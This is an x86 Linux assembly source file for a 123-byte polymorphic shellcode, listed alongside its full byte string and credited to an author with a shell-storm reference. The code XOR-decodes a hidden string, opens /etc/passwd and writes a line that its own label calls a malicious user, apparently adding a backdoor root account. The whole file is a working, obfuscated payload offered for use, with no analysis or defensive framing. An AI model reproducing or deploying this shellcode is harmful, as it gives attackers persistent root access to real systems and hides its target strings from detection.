; Author: Robert C. Raducioiu (rbct)
; Reference: http://shell-storm.org/shellcode/files/shellcode-561.php
; Shellcode: "\xeb\x48\x5f\x89\xfe\x31\xc9\xf7\xe1\xb1\x0b\x81\x37\x71\x63\x63\x75\x83\xc7\x04\xe2\xf5\x89\xf7\x89\xfb\x83\xc3\x0c\x53\x5e\x57\x5b\xb0\x06\x48\xb2\x69\xc1\xc2\x02\x66\xb9\x43\x04\x49\xcd\x80\x93\x31\xc0\x50\x5a\x6a\x20\x5a\x4a\x6a\x03\x58\x40\x56\x59\xcd\x80\x31\xc0\xb0\x06\xcd\x80\x40\xcd\x80\xe8\xb3\xff\xff\xff\x5e\x06\x17\x16\x5e\x13\x02\x06\x02\x14\x07\x75\x05\x0c\x0c\x07\x4b\x59\x53\x4f\x41\x59\x17\x45\x41\x11\x59\x5a\x03\x0c\x0c\x01\x4b\x4c\x01\x1c\x1f\x4c\x01\x14\x02\x0b\x69\x75"
; Length: 123 bytes

global _start

section .text

_start:

    jmp short CallRunShellcode

RunShellcode:

    pop edi
    mov esi, edi

    xor ecx, ecx
    mul ecx

    mov cl, 11
    
DecodeStringBytes:
    
    xor DWORD [edi], 0x75636371

    add edi, 0x4
    loop DecodeStringBytes

OpenFile:

    mov edi, esi

    mov ebx, edi
    add ebx, 0xc

    push ebx
    pop esi

    push edi
    pop ebx

    mov al,0x6
    dec eax

    mov dl, 0x69
    rol edx, 2

    mov cx,0x443
    dec ecx

    ; call syscall 0x5: open()
    int 0x80

AddMaliciousUser:

    xchg ebx,eax
    xor eax, eax

    push eax
    pop edx

    push 0x20
    pop edx
    dec edx

    push 0x3
    pop eax
    inc eax

    push esi
    pop ecx

    ; call syscall write()
    int 0x80

CloseFileHandle:

    xor eax, eax

    ; call syscall close()
    mov al,0x6
    int 0x80

Exit:

    ; call syscall exit() 
    inc eax
    int 0x80

CallRunShellcode:

    call RunShellcode
    EncodedStringBytes: db 0x5e,0x06,0x17,0x16,0x5e,0x13,0x02,0x06,0x02,0x14,0x07,0x75,0x05,0x0c,0x0c,0x07,0x4b,0x59,0x53,0x4f,0x41,0x59,0x17,0x45,0x41,0x11,0x59,0x5a,0x03,0x0c,0x0c,0x01,0x4b,0x4c,0x01,0x1c,0x1f,0x4c,0x01,0x14,0x02,0x0b,0x69,0x75
